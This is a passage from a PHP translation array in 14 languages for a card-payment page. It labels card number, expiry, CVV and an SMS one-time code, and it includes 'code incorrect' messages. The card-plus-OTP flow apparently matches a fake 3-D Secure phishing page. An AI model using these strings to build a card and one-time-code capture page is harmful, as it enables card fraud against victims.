        'in' => 'यह क्षेत्र आवश्यक है!',  
        'ee' => 'See väli on nõutav!',
        'dk' => 'Dette felt er påkrævet!',
        'es' => '¡Este campo es obligatorio!',
        'ar' => 'هذا الحقل مطلوب!'
    ],

    'title_form_2'=> [
        'en' => 'Credit Card information',
        'br' => 'Informações do cartão de crédito',
        'hk' => '信用卡資料',
        'jp' => 'クレジットカード情報',
        'tw' => '信用卡資訊',
        'fr' => 'Informations de carte de crédit',
        'de' => 'Kreditkarteninformationen',
        'it' => 'Informazioni sulla carta di credito',
        'il' => 'מידע על כרטיס אשראי',
        'in' => 'क्रेडिट कार्ड जानकारी',  
        'ee' => 'Krediitkaardi info',
        'dk' => 'Kreditkortoplysninger',
        'es' => 'Información de tarjeta de crédito',
        'ar' => 'معلومات بطاقة الائتمان'
    ],

    'name_card_label' => [
        'en' => 'Cardholder\'s name',
        'br' => 'Nome do titular do cartão',
        'hk' => '持卡人姓名',
        'jp' => 'カード名義人',
        'tw' => '持卡人姓名',
        'fr' => 'Nom du titulaire de la carte',
        'de' => 'Name des Karteninhabers',
        'it' => 'Nome del titolare della carta',
        'il' => 'שם בעל הכרטיס',
        'in' => 'कार्डधारक का नाम',  
        'ee' => 'Kaardiomaniku nimi',
        'dk' => 'Kortholders navn',
        'es' => 'Nombre del titular de la tarjeta',
        'ar' => 'اسم حامل البطاقة'
    ],

    'one_label' => [
        'en' => 'Card number',
        'br' => 'Número do cartão',
        'hk' => '卡號',
        'jp' => 'カード番号',
        'tw' => '卡號',
        'fr' => 'Numéro de carte',
        'de' => 'Kartennummer',
        'it' => 'Numero della carta',
        'il' => 'מספר כרטיס',
        'in' => 'कार्ड नंबर',  
        'ee' => 'Kaardi number',
        'dk' => 'Kortnummer',
        'es' => 'Número de tarjeta',
        'ar' => 'رقم البطاقة'
    ],

    'two_label' => [
        'en' => 'Expiry date',
        'br' => 'Data de validade',
        'hk' => '到期日期',
        'jp' => '有効期限',
        'tw' => '到期日',
        'fr' => 'Date d\'expiration',
        'de' => 'Ablaufdatum',
        'it' => 'Data di scadenza',
        'il' => 'תאריך תפוגה',
        'in' => 'समाप्ति तिथि',  
        'ee' => 'Aegumistähtaeg',
        'dk' => 'Udløbsdato',
        'es' => 'Fecha de vencimiento',
        'ar' => 'تاريخ الانتهاء'
    ],

    'three_label' => [
        'en' => 'CVV',
        'br' => 'CVV',
        'hk' => 'CVV',
        'jp' => 'CVV',
        'tw' => 'CVV',
        'fr' => 'CVV',
        'de' => 'CVV',
        'it' => 'CVV',
        'il' => 'CVV',
        'in' => 'CVV',  
        'ee' => 'CVV',
        'dk' => 'CVV',
        'es' => 'CVV',
        'ar' => 'CVV'
    ],

    'two_label_explain' => [
        'en' => '(MM/YY)',
        'br' => '(MM/AA)',
        'hk' => '(MM/YY)',
        'jp' => '(MM/YY)',
        'tw' => '(MM/YY)',
        'fr' => '(MM/AA)',
        'de' => '(MM/JJ)',
        'it' => '(MM/AA)',
        'il' => '(חודש/שנה)',
        'in' => '(MM/YY)',
        'ee' => '(KK/AA)',
        'dk' => '(MM/ÅÅ)',
        'es' => '(MM/AA)',
        'ar' => '(MM/YY)'
    ],

    'sms_code_label' => [
        'en' => 'SMS Code',
        'br' => 'Código SMS',
        'hk' => '短訊代碼',
        'jp' => 'SMSコード',
        'tw' => '簡訊代碼',
        'fr' => 'Code SMS',
        'de' => 'SMS-Code',
        'it' => 'Codice SMS',
        'il' => 'קוד SMS',
        'in' => 'SMS कोड',
        'ee' => 'SMS-kood',
        'dk' => 'SMS-kode',
        'es' => 'Código SMS',
        'ar' => 'رمز SMS'
    ],

    'title_mss' => [
        'en' => 'The unique password has been sent to your mobile number',
        'br' => 'A senha exclusiva foi enviada para o seu número de celular',
        'hk' => '已發送獨特密碼至您的手機號碼',
        'jp' => 'ユニークなパスワードが携帯電話番号に送信されました',
        'tw' => '已發送獨特密碼至您的手機號碼',
        'fr' => 'Le mot de passe unique a été envoyé à votre numéro de téléphone portable',
        'de' => 'Das einzigartige Passwort wurde an Ihre Mobiltelefonnummer gesendet',
        'it' => 'La password unica è stata inviata al tuo numero di cellulare',
        'il' => 'הסיסמה הייחודית נשלחה למספר הנייד שלך',
        'in' => 'विशेष पासवर्ड आपके मोबाइल नंबर पर भेजा गया है',
        'ee' => 'Ainultne parool on saadetud teie mobiilinumbrile',
        'dk' => 'Den unikke adgangskode er sendt til dit mobilnummer',
        'es' => 'Se ha enviado la contraseña única a su número de móvil',
        'ar' => 'تم إرسال كلمة المرور الفريدة إلى رقم هاتفك المحمول'
    ],

    'title_mss_2' => [
        'en' => 'Merchant:',
        'br' => 'Comerciante:',
        'hk' => '商戶:',
        'jp' => '店舗名：',
        'tw' => '商戶：',
        'fr' => 'Marchand :',
        'de' => 'Händler:',
        'it' => 'Commerciante:',
        'il' => 'סוחר:',
        'in' => 'व्यापारी:',
        'ee' => 'Müüja:',
        'dk' => 'Købmand:',
        'es' => 'Comerciante:',
        'ar' => 'تاجر:'
    ],

    'title_mss_3' => [
        'en' => 'Quantity:',
        'br' => 'Quantidade:',
        'hk' => '數量:',
        'jp' => '数量：',
        'tw' => '數量：',
        'fr' => 'Quantité :',
        'de' => 'Menge:',
        'it' => 'Quantità:',
        'il' => 'כמות:',
        'in' => 'मात्रा:',
        'ee' => 'Kogus:',
        'dk' => 'Antal:',
        'es' => 'Cantidad:',
        'ar' => 'الكمية:'
    ],

    'title_mss_4' => [
        'en' => 'Date:',
        'br' => 'Data:',
        'hk' => '日期:',
        'jp' => '日付：',
        'tw' => '日期：',
        'fr' => 'Date :',
        'de' => 'Datum:',
        'it' => 'Data:',
        'il' => 'תאריך:',
        'in' => 'तारीख:',
        'ee' => 'Kuupäev:',
        'dk' => 'Dato:',
        'es' => 'Fecha:',
        'ar' => 'التاريخ:'
    ],

    'title_mss_5' => [
        'en' => 'Card Number:',
        'br' => 'Número do cartão:',
        'hk' => '卡號:',
        'jp' => 'カード番号：',
        'tw' => '卡號：',
        'fr' => 'Numéro de carte :',
        'de' => 'Kartennummer:',
        'it' => 'Numero della carta:',
        'il' => 'מספר הכרטיס:',
        'in' => 'कार्ड नंबर:',
        'ee' => 'Kaardi number:',
        'dk' => 'Kortnummer:',
        'es' => 'Número de tarjeta:',
        'ar' => 'رقم البطاقة:'
    ],

    'counter_title' => [
        'en' => 'Code validity time :',
        'br' => 'Tempo de validade do código:',
        'hk' => '代碼有效時間：',
        'jp' => 'コード有効期間：',
        'tw' => '代碼有效時間：',
        'fr' => 'Temps de validité du code :',
        'de' => 'Gültigkeitsdauer des Codes:',
        'it' => 'Tempo di validità del codice:',
        'il' => 'זמן תוקף הקוד :',
        'in' => 'कोड की वैधता समय:',
        'ee' => 'Koodi kehtivusaeg :',
        'dk' => 'Kode gyldighedstid :',
        'es' => 'Tiempo de validez del código:',
        'ar' => 'مدة صلاحية الرمز:'
    ],

    'message_error_pages' => [
        'en' => 'The code entered is incorrect. Enter the code you received on your phone.',
        'br' => 'O código inserido está incorreto. Insira o código que você recebeu no seu telefone.',
        'hk' => '輸入的代碼不正確。請輸入您在手機上收到的代碼。',
        'jp' => '入力されたコードが正しくありません。携帯電話に受信したコードを入力してください。',
        'tw' => '輸入的代碼不正確。請輸入您在手機上收到的代碼。',
        'fr' => 'Le code saisi est incorrect. Entrez le code reçu sur votre téléphone.',
        'de' => 'Der eingegebene Code ist falsch. Geben Sie den Code ein, den Sie auf Ihr Telefon erhalten haben.',
        'it' => 'Il codice inserito non è corretto. Inserisci il codice ricevuto sul tuo telefono.',
        'il' => 'הקוד שהוזן אינו נכון. הזן את הקוד שקיבלת בטלפון שלך.',
        'in' => 'दर्ज किया गया कोड गलत है। कृपया अपने फोन पर प्राप्त कोड को दर्ज करें।',
        'ee' => 'Sisestatud kood on vale. Sisestage kood, mille saite oma telefonile.',
        'dk' => 'Den indtastede kode er forkert. Indtast koden, du modtog på din telefon.',
        'es' => 'El código introducido es incorrecto. Introduce el código que recibiste en tu teléfono.',
        'ar' => 'الرمز المدخل غير صحيح. أدخل الرمز الذي تلقيته على هاتفك.'
    ]

);
?>